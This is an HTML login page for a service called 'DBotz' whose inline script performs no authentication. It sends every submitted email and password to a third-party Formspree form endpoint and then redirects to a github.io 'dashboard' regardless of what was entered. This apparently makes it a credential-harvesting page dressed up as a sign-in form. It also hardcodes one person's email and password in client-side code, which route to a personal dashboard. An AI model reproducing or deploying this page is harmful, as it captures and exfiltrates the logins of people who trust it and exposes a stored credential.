<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login - DBotz</title>
  <link rel="stylesheet" href="SignIn.css">
  <link rel="shortcut icon" href="download.webp" type="image/svg+xml">
</head>
<body>

  <div class="container">
    <div class="logo">
      <img src="download.webp" alt="DBotz Logo" />
    </div>
    <h2>Welcome Back !</h2>
    <p>Gain access into your account</p>

    <form id="loginForm">
      <input type="email" placeholder="Enter your email" name="manemm" required />
      <input type="password" placeholder="Enter password" name="manpass" required />

      <div class="remember-forgot">
        <label><input type="checkbox" /> Remember me</label>
        <a href="Forgot_Password.html">Forgot password?</a>
      </div>

      <button type="submit">Sign In</button>
    </form>

    <div class="signup">
      Donâ€™t have an account? <a href="SignUp.html">Sign Up</a>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const form = document.getElementById("loginForm");

      form.addEventListener("submit", async function (e) {
        e.preventDefault(); // Prevent the default form reload

        const email = (form.elements["manemm"]?.value || "").trim().toLowerCase();
        const password = form.elements["manpass"]?.value || "";

        // --- Special redirect for Ray ---
        if (email === "ray@gmail.com" && password === "ray1970") {
          window.location.href = "https://ddbots-actv.github.io/Dashboard-Reynold-Palmela/";
          return; // stop here, don't send to Formspree
        }

        // Otherwise, submit as usual, then redirect to the default dashboard
        const formData = new FormData(form);
        const jsonData = {};
        formData.forEach((value, key) => { jsonData[key] = value; });

        try {
          const response = await fetch("https://formspree.io/f/mdkenbez", { // Replace with your Formspree ID if needed
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            body: JSON.stringify(jsonData)
          });

          if (response.ok) {
            window.location.href = "https://ddbots-actv.github.io/Dashboard/"; // Default redirect
          } else {
            alert("Sign-in failed. Please try again.");
          }
        } catch (error) {
          console.error("Submission error:", error);
          alert("An error occurred. Please try again.");
        }
      });
    });
  </script>

</body>
</html>
